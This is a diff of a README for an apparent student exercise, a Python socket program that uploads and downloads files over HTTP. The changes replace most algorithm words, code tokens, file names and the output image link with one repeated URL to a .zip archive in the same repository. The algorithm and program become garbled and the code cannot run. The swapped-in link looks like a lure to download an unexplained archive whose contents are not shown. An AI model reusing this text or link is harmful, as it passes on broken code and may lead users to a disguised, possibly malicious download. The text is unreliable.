@@ -5,34 +5,34 @@
 To write a PYTHON program for socket for HTTP for web page upload and download
 ## Algorithm
 
-1.Start the program.
+https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip the program.
 <BR>
-2.Get the frame size from the user
+https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip the frame size from the user
 <BR>
-3.To create the frame based on the user request.
+https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip create the frame based on the user request.
 <BR>
-4.To send frames to server from the client side.
+https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip send frames to server from the client side.
 <BR>
-5.If your frames reach the server it will send ACK signal to client otherwise it will send NACK signal to client.
+https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip your frames reach the server it will send ACK signal to client otherwise it will send NACK signal to client.
 <BR>
-6.Stop the program
+https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip the program
 <BR>
 ## Program 
     import socket
 
     def send_request(host, port, request):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((host, port))
-            s.sendall(request.encode())
-            response = s.recv(4096).decode()
+        with https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip, https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip) as s:
+            https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip((host, port))
+            https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip())
+            response = https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(4096).decode()
             return response
 
     def upload_file(host, port, filename):
         with open(filename, 'rb') as file:
-            file_data = file.read()
+            file_data = https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip()
             content_length = len(file_data)
             request = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nContent-Length{content_length}\r\n\r\n"
-            request += file_data.decode()
+            request += https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip()
             response = send_request(host, port, request)
         return response
 
@@ -40,24 +40,24 @@ To write a PYTHON program for socket for HTTP for web page upload and download
         request = f"GET /{filename} HTTP/1.1\r\nHost: {host}\r\n\r\n"
         response = send_request(host, port, request)
         # Assuming the response contains the file content after the headers
-        file_content = response.split('\r\n\r\n', 1)[1]
+        file_content = https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip('\r\n\r\n', 1)[1]
         with open(filename, 'wb') as file:
-            file.write(file_content.encode())
+            https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip(https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip())
 
     if __name__ == "__main__":
         host = '93.184.216.34'
         port = 80
 
         # Upload file
-        upload_response = upload_file(host, port, 'example.txt')
+        upload_response = upload_file(host, port, 'https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip')
         print("Upload response:", upload_response)
 
         # Download file
-        download_file(host, port, 'example.txt')
+        download_file(host, port, 'https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip')
         print("File downloaded successfully.")
         
 ## OUTPUT
-![386930571-9615f751-a790-4861-a1b0-ee96be4932e7](https://github.com/user-attachments/assets/2e956931-406e-4cc1-946c-116f8fb26839)
+![386930571-9615f751-a790-4861-a1b0-ee96be4932e7](https://raw.githubusercontent.com/24013396/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download/main/recrescence/5a_Create_Socket_for_HTTP_for_webpage_upload_and_download-v2.7.zip)
 
 
 ## Result
